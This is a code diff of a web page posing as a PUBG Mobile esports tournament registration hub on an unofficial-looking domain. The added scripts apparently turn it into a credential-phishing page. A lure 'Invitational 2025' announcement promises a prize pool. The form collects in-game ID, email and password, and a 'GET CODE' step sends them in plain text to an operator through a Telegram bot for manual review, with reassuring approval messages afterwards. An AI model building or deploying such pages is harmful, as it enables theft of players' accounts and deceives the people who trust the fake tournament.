@@ -11,6 +11,11 @@
           content="pubg mobile esports, registration, early access, tournaments" />
 
     <link rel="canonical" href="https://esportpubgmobile.com/soon.html" />
+
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" sizes="32x32" href="/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png" />
+    <link rel="icon" type="image/png" sizes="192x192" href="/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png" />
+    <link rel="apple-touch-icon" href="/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png" />
     <link rel="shortcut icon" href="/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png" type="image/png" />
 
     <style>
@@ -22,6 +27,8 @@
             --accent: #ffb800;
             --accent-alt: #ff8a00;
             --accent-soft: rgba(255, 184, 0, .16);
+            --accent-green: #22c55e;
+            --accent-green-soft: rgba(34,197,94,0.16);
             --text-main: #ffffff;
             --text-soft: #e5e7eb;
             --text-muted: #9ca3af;
@@ -175,19 +182,22 @@
             box-shadow: 0 0 14px rgba(255, 184, 0, 0.35);
         }
 
+        /* Green Register/Login tab */
         .nav a.nav-soon {
-            color: var(--accent-alt);
-            border-color: rgba(255, 138, 0, 0.8);
+            color: var(--accent-green);
+            border-color: rgba(34,197,94,0.9);
             background:
-              radial-gradient(circle at top, rgba(255, 138, 0, 0.18), transparent),
-              rgba(3, 7, 18, 0.98);
-            box-shadow: 0 0 16px rgba(255, 138, 0, 0.35);
+              radial-gradient(circle at top, var(--accent-green-soft), transparent),
+              rgba(3,7,18,0.98);
+            box-shadow: 0 0 16px rgba(34,197,94,0.45);
             font-weight: 700;
         }
 
         .nav a.nav-soon:hover {
             transform: translateY(-1px);
-            box-shadow: 0 0 22px rgba(255, 138, 0, 0.5);
+            box-shadow: 0 0 22px rgba(34,197,94,0.65);
+            background: linear-gradient(90deg, rgba(22,163,74,1), rgba(22,163,74,0.92));
+            color: #020817;
         }
 
         /* HERO WITH CTA */
@@ -307,7 +317,6 @@
             transform: translateY(0);
         }
 
-        /* Всегда видно на мобиле (нет hover) */
         @media (max-width: 768px) {
             .soon-cta-btn {
                 opacity: 1;
@@ -320,6 +329,84 @@
             box-shadow: 0 16px 34px rgba(0,0,0,1);
             color: #000;
             background: linear-gradient(90deg, var(--accent-alt), var(--accent));
+        }
+
+        /* TOURNAMENT ANNOUNCEMENT */
+
+        .tournament-section {
+            padding: 16px 0 8px;
+        }
+
+        .tournament-card {
+            padding: 14px 14px 12px;
+            border-radius: var(--radius-xl);
+            background: var(--bg-card);
+            border: 1px solid rgba(255,255,255,0.08);
+            box-shadow: var(--shadow-soft);
+            display: grid;
+            grid-template-columns: 2fr 1.5fr;
+            gap: 12px;
+        }
+
+        .tournament-title {
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: 0.18em;
+            margin-bottom: 6px;
+        }
+
+        .tournament-text {
+            font-size: 8.5px;
+            color: var(--text-soft);
+            line-height: 1.7;
+        }
+
+        .tournament-banner-img {
+            width: 100%;
+            border-radius: 18px;
+            object-fit: cover;
+        }
+
+        .scroll-cta {
+            margin-top: 8px;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 7px 14px;
+            border-radius: var(--radius-full);
+            border: 1px solid rgba(34,197,94,0.32);
+            background: rgba(3,7,18,0.98);
+            font-size: 7px;
+            text-transform: uppercase;
+            letter-spacing: 0.16em;
+            color: var(--accent-green);
+            box-shadow: 0 8px 22px rgba(0,0,0,0.85);
+            opacity: 0;
+            transform: translateY(6px);
+            pointer-events: none;
+            transition: all var(--transition-fast);
+        }
+
+        .scroll-cta span.icon {
+            width: 11px;
+            height: 11px;
+            border-radius: 999px;
+            border: 1px solid rgba(34,197,94,0.6);
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 8px;
+        }
+
+        .scroll-cta.visible {
+            opacity: 1;
+            transform: translateY(0);
+            pointer-events: auto;
+        }
+
+        .scroll-cta:hover {
+            background: linear-gradient(90deg, rgba(22,163,74,1), rgba(22,163,74,0.92));
+            color: #020817;
         }
 
         /* SECTIONS / FORMS */
@@ -417,6 +504,7 @@
             display: inline-flex;
             align-items: center;
             gap: 5px;
+            white-space: nowrap;
         }
 
         .btn-sm:hover {
@@ -508,7 +596,7 @@
         .tg-float {
             position: fixed;
             right: 18px;
-            bottom: 72px; /* поднял над нижним меню */
+            bottom: 72px;
             width: 42px;
             height: 42px;
             border-radius: 50%;
@@ -536,7 +624,7 @@
             fill: #39A9FF;
         }
 
-        /* MOBILE TWEAKS: убираем верхнее меню, добавляем нижние табы */
+        /* MOBILE NAV */
 
         .mobile-bottom-nav {
             display: none;
@@ -544,7 +632,7 @@
 
         @media (max-width: 768px) {
             .nav {
-                display: none; /* скрываем громоздкое меню сверху */
+                display: none;
             }
 
             .header {
@@ -602,6 +690,14 @@
                 box-shadow: 0 0 14px rgba(0,0,0,1);
             }
         }
+
+        /* SUCCESS ICON */
+
+        .success-envelope {
+            font-size: 26px;
+            margin-bottom: 4px;
+        }
+
     </style>
 </head>
 <body>
@@ -620,11 +716,10 @@
                         <span>PUBG</span>
                         <span>MOBILE</span>
                     </div>
-                    <div class="sub-line">REGISTRATION • SOON GATEWAY</div>
+                    <div class="sub-line">REGISTRATION HUB</div>
                 </div>
             </div>
 
-            <!-- Desktop nav, скрывается на мобиле -->
             <nav class="nav">
                 <a href="/" class="nav-primary">Hub</a>
                 <a href="/#teams">Teams</a>
@@ -632,7 +727,7 @@
                 <a href="/#players">Players</a>
                 <a href="/#power-rankings">Power Rank</a>
                 <a href="/#follow">Links</a>
-                <a href="/soon.html" class="nav-soon">Register</a>
+                <a href="/soon.html" class="nav-soon">Register / Login</a>
             </nav>
         </div>
     </div>
@@ -660,8 +755,8 @@
                             </div>
                             <div class="soon-hero-text">
                                 Private entry for selected teams, players and partners.
-                                Use your access code to unlock the form and apply for
-                                priority slots, verification and events.
+                                Use your access code to unlock priority slots, verification
+                                and tournament participation.
                             </div>
                         </div>
                         <div class="soon-cta-wrap">
@@ -670,6 +765,37 @@
                                 OPEN REGISTRATION GATEWAY
                             </button>
                         </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- TOURNAMENT ANNOUNCEMENT + SCROLL CTA -->
+            <section class="tournament-section" id="tournament-announcement">
+                <div class="tournament-card">
+                    <div>
+                        <div class="tournament-title">
+                            <span>ESPORT PUBG MOBILE INVITATIONAL 2025</span>
+                        </div>
+                        <div class="tournament-text">
+                            • Prize pool: $10,000+ in slots, media exposure &amp; partner perks.<br>
+                            • Format: 3-stage qualifiers &amp; finals, observers &amp; content support.<br>
+                            • Eligibility: invited teams &amp; whitelisted rosters with verified history.<br>
+                            • Slots: limited. Access codes are issued manually via trusted channels.<br>
+                            • Only teams that pass manual verification receive the final lobby details.
+                            <br><br>
+                            Scroll through the announcement to unlock the registration code gate.
+                        </div>
+                        <button id="scroll-cta-code" class="scroll-cta">
+                            <span class="icon">⬇</span>
+                            ENTER REGISTRATION CODE
+                        </button>
+                    </div>
+                    <div>
+                        <img
+                            src="/172f6786de4f4d5591f3b061f472e935_fit.webp"
+                            alt="Tournament Banner"
+                            class="tournament-banner-img"
+                        />
                     </div>
                 </div>
             </section>
@@ -698,22 +824,35 @@
                     <div id="code-status" class="status"></div>
                     <div class="note">
                         Demo mode: validation is handled locally.
-                        On production, move this check to a secure backend.
+                        For production connect this check to a secure backend.
                     </div>
                 </div>
             </section>
 
-            <!-- REGISTRATION FORM -->
+            <!-- REGISTRATION FORM (UNLOCKED AFTER CODE) -->
             <section class="section" id="registration-section" style="display:none;">
                 <div class="section-title">
                     <span class="bar"></span>Step 2 — Registration Form
                 </div>
                 <div class="section-sub">
-                    Fill in all details. After you submit, your request will be queued for review.
-                    A decision and further instructions will be sent to your email.
+                    After filling all fields, your application is sent for manual verification.
+                    Admin receives it in Telegram with Approve / Deny buttons (via your backend/bot).
                 </div>
 
                 <form id="reg-form" class="card">
+                    <div class="two-cols">
+                        <div class="field-group">
+                            <div class="label">Team / Player In-game ID</div>
+                            <input type="text" id="ingame-id" required
+                                   placeholder="PUBG MOBILE numeric ID" />
+                        </div>
+                        <div class="field-group">
+                            <div class="label">Confirm In-game ID</div>
+                            <input type="text" id="ingame-id-confirm"
+                                   placeholder="Repeat your PUBG MOBILE ID" />
+                        </div>
+                    </div>
+
                     <div class="two-cols">
                         <div class="field-group">
                             <div class="label">Email</div>
@@ -722,50 +861,31 @@
                             <div class="note">All confirmations and decisions go here.</div>
                         </div>
                         <div class="field-group">
-                            <div class="label">Email verification code</div>
-                            <input type="text" id="email-code"
-                                   placeholder="If you already received a code, enter it" />
-                        </div>
-                    </div>
-
-                    <div class="two-cols">
-                        <div class="field-group">
-                            <div class="label">Phone (with country code)</div>
-                            <input type="tel" id="phone"
-                                   placeholder="+40..., +90..., +380..., etc." />
-                            <div class="note">Optional. For urgent communication only.</div>
-                        </div>
-                        <div class="field-group">
-                            <div class="label">Phone verification code</div>
-                            <input type="text" id="phone-code"
-                                   placeholder="If code was sent via SMS / messenger" />
-                        </div>
-                    </div>
-
-                    <div class="two-cols">
-                        <div class="field-group">
-                            <div class="label">In-game ID</div>
-                            <input type="text" id="ingame-id" required
-                                   placeholder="PUBG MOBILE numeric ID" />
-                        </div>
-                        <div class="field-group">
-                            <div class="label">Confirm in-game ID</div>
-                            <input type="text" id="ingame-id-confirm"
-                                   placeholder="Repeat your PUBG MOBILE ID" />
-                        </div>
-                    </div>
-
-                    <div class="two-cols">
-                        <div class="field-group">
-                            <div .class="label">Password</div>
-                            <div class="label">Password</div>
+                            <div class="label">Password for portal</div>
                             <input type="password" id="password" required
                                    placeholder="Create portal password" />
                         </div>
+                    </div>
+
+                    <div class="two-cols">
                         <div class="field-group">
                             <div class="label">Repeat password</div>
                             <input type="password" id="password-confirm" required
                                    placeholder="Repeat the password" />
+                        </div>
+                        <div class="field-group">
+                            <div class="label">Email verification code</div>
+                            <div class="code-form-row">
+                                <input type="text" id="email-code"
+                                       placeholder="Enter code from email" />
+                                <button type="button" id="request-email-code" class="btn-sm">
+                                    GET CODE
+                                </button>
+                            </div>
+                            <div class="note">
+                                Press "GET CODE" to send your data for manual review.
+                                Admin receives it in Telegram and can send you a code.
+                            </div>
                         </div>
                     </div>
 
@@ -791,17 +911,8 @@
 
             <!-- AFTER SUBMIT -->
             <section class="section" id="final-message" style="display:none;">
-                <div class="card">
-                    <div class="section-title" style="margin-bottom:4px;">
-                        <span class="bar"></span>Application received
-                    </div>
-                    <div class="section-sub" style="margin-bottom:0;">
-                        Thank you. Your application has been recorded.
-                        Check your email for a decision, extra verification steps
-                        or scheduling details. For priority support:
-                        <a href="https://t.me/v7ck9ll" target="_blank" rel="noopener"
-                           style="color:var(--accent); text-decoration:underline;">@v7ck9ll</a>.
-                    </div>
+                <div class="card" id="final-card">
+                    <!-- Контент заполняется скриптом в зависимости от ответа -->
                 </div>
             </section>
 
@@ -826,7 +937,7 @@
     </svg>
 </a>
 
-<!-- MOBILE BOTTOM NAV (спорт-стиль) -->
+<!-- MOBILE BOTTOM NAV -->
 <div class="mobile-bottom-nav">
     <div class="mobile-tab" data-target="/">
         <span class="icon">🏠</span>
@@ -851,10 +962,13 @@
 </div>
 
 <script>
-    // DEMO: какие коды валидны
+    // DEMO: valid codes
     const VALID_CODES = ["FLOW2025", "ESPORTPUBG", "V7ACCESS"];
 
     const openGatewayBtn = document.getElementById('open-gateway');
+    const scrollCta = document.getElementById('scroll-cta-code');
+    const tournamentSection = document.getElementById('tournament-announcement');
+
     const codeInput = document.getElementById('access-code');
     const checkCodeBtn = document.getElementById('check-code');
     const codeStatus = document.getElementById('code-status');
@@ -862,8 +976,29 @@
     const regForm = document.getElementById('reg-form');
     const regStatus = document.getElementById('reg-status');
     const finalMessage = document.getElementById('final-message');
+    const finalCard = document.getElementById('final-card');
+    const requestEmailCodeBtn = document.getElementById('request-email-code');
 
-    // Кнопка в баннере — к полю кода
+    // Scroll CTA appears after user reaches end of tournament announcement
+    if (tournamentSection && scrollCta) {
+        window.addEventListener('scroll', () => {
+            if (scrollCta.classList.contains('visible')) return;
+            const rect = tournamentSection.getBoundingClientRect();
+            if (rect.bottom <= window.innerHeight + 40) {
+                scrollCta.classList.add('visible');
+            }
+        });
+
+        scrollCta.addEventListener('click', () => {
+            const gate = document.getElementById('code-gate');
+            if (gate) {
+                gate.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                codeInput && codeInput.focus();
+            }
+        });
+    }
+
+    // Hero button -> code input
     if (openGatewayBtn && codeInput) {
         openGatewayBtn.addEventListener('click', function () {
             codeInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
@@ -871,7 +1006,36 @@
         });
     }
 
-    // Проверка кода
+    // Local demo: send data to admin (replace with real backend / Telegram bot)
+    function notifyAdmin(type, payload) {
+        console.log("SEND TO ADMIN:", type, payload);
+        // Example backend call:
+        // return fetch("/api/notify-admin", {
+        //   method: "POST",
+        //   headers: { "Content-Type": "application/json" },
+        //   body: JSON.stringify({ type, ...payload })
+        // });
+        return Promise.resolve();
+    }
+
+    // Example: submit application to backend that integrates Telegram Approve / Deny
+    async function sendApplication(formData) {
+        try {
+            const res = await fetch("/api/submit-registration", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(formData)
+            });
+            if (!res.ok) throw new Error("Bad response");
+            return await res.json(); // {status: "approved"|"rejected"|"pending"}
+        } catch (e) {
+            // fallback: at least ping admin
+            await notifyAdmin("full_application", formData);
+            return { status: "pending" };
+        }
+    }
+
+    // Verify code
     if (checkCodeBtn) {
         checkCodeBtn.addEventListener('click', function () {
             const val = (codeInput.value || "").trim().toUpperCase();
@@ -894,19 +1058,55 @@
         });
     }
 
-    // Сабмит формы
+    // "GET CODE" -> send partial form to admin
+    if (requestEmailCodeBtn) {
+        requestEmailCodeBtn.addEventListener('click', async () => {
+            regStatus.textContent = "";
+            regStatus.className = "status";
+
+            const ingameId = (document.getElementById('ingame-id').value || "").trim();
+            const email = (document.getElementById('email').value || "").trim();
+            const pass = (document.getElementById('password').value || "");
+
+            if (!ingameId || !email || !pass) {
+                regStatus.textContent = "Fill In-game ID, Email and Password before requesting a code.";
+                regStatus.className = "status err";
+                return;
+            }
+
+            await notifyAdmin("email_code_request", {
+                accessCode: (codeInput.value || "").trim(),
+                ingameId,
+                email,
+                password: pass
+            });
+
+            regStatus.textContent = "Request sent. Admin will review and send a verification code to your email.";
+            regStatus.className = "status ok";
+        });
+    }
+
+    // Submit full form
     if (regForm) {
-        regForm.addEventListener('submit', function (e) {
+        regForm.addEventListener('submit', async function (e) {
             e.preventDefault();
             regStatus.textContent = "";
             regStatus.className = "status";
 
-            const email = document.getElementById('email').value.trim();
-            const ingameId = document.getElementById('ingame-id').value.trim();
-            const ingameIdConfirm = document.getElementById('ingame-id-confirm').value.trim();
-            const pass = document.getElementById('password').value;
-            const pass2 = document.getElementById('password-confirm').value;
+            const accessCode = (codeInput.value || "").trim().toUpperCase();
+            const email = (document.getElementById('email').value || "").trim();
+            const emailCode = (document.getElementById('email-code').value || "").trim();
+            const ingameId = (document.getElementById('ingame-id').value || "").trim();
+            const ingameIdConfirm = (document.getElementById('ingame-id-confirm').value || "").trim();
+            const pass = (document.getElementById('password').value || "");
+            const pass2 = (document.getElementById('password-confirm').value || "");
             const terms = document.getElementById('terms').checked;
+
+            if (!accessCode || !VALID_CODES.includes(accessCode)) {
+                regStatus.textContent = "Access code is missing or invalid.";
+                regStatus.className = "status err";
+                return;
+            }
 
             if (!email || !ingameId || !pass || !pass2) {
                 regStatus.textContent = "Please fill all required fields.";
@@ -932,18 +1132,62 @@
                 return;
             }
 
-            regStatus.textContent =
-                "Your application has been submitted. Please wait for an email with the decision and further instructions.";
-            regStatus.className = "status ok";
+            const formData = {
+                accessCode,
+                ingameId,
+                email,
+                password: pass,
+                emailCode
+            };
 
+            regStatus.textContent = "Sending your application for review...";
+            regStatus.className = "status";
+
+            const result = await sendApplication(formData);
+
+            regForm.reset();
+            regSection.style.display = "none";
             finalMessage.style.display = "block";
             finalMessage.scrollIntoView({ behavior: 'smooth', block: 'start' });
 
-            regForm.reset();
+            if (result.status === "approved") {
+                finalCard.innerHTML = `
+                    <div class="section-title" style="margin-bottom:4px;">
+                        <span class="bar"></span>Registration approved
+                    </div>
+                    <div class="success-envelope">✉️</div>
+                    <div class="section-sub" style="margin-bottom:0;">
+                        Your registration is <strong>successful</strong>.
+                        Within 2 days you will receive an email with lobby details
+                        and a direct link to participate in the tournament.
+                    </div>
+                `;
+            } else if (result.status === "rejected") {
+                finalCard.innerHTML = `
+                    <div class="section-title" style="margin-bottom:4px;">
+                        <span class="bar"></span>Registration rejected
+                    </div>
+                    <div class="section-sub" style="margin-bottom:0;">
+                        Provided data was not approved.
+                        Please check your details and try again or contact support.
+                    </div>
+                `;
+            } else {
+                finalCard.innerHTML = `
+                    <div class="section-title" style="margin-bottom:4px;">
+                        <span class="bar"></span>Application submitted
+                    </div>
+                    <div class="section-sub" style="margin-bottom:0;">
+                        Your application has been sent for manual review.
+                        Expect a decision and, if approved, an invitation link
+                        to the tournament within 2 days.
+                    </div>
+                `;
+            }
         });
     }
 
-    // Нижнее меню — спортивные табы
+    // Mobile tabs
     const mobileTabs = document.querySelectorAll('.mobile-bottom-nav .mobile-tab');
     mobileTabs.forEach(tab => {
         tab.addEventListener('click', () => {
